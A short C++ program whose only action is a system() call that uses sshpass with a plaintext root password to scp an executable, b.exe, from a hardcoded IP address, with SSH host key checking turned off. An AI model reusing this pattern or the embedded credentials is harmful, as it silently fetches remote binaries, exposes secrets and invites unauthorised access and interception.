#include <stdlib.h>
#include <iostream>
#include <sstream>
#include <string>

using namespace std;

int main(){
  system("sshpass -p \"sxk123\" scp -o StrictHostKeyChecking=no root@47.94.192.213:/root/b.exe .");
  return 0;
}
